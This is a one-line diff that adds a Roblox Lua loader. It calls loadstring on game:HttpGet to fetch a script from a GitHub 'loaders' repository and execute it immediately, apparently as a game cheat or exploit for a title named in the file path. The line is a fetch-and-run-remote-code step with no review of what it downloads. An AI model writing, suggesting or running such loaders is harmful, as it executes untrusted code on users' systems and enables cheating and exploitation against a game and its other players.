@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/shoot-for-eggs-spam3-ymva5kk9kx48b2.lua"))()
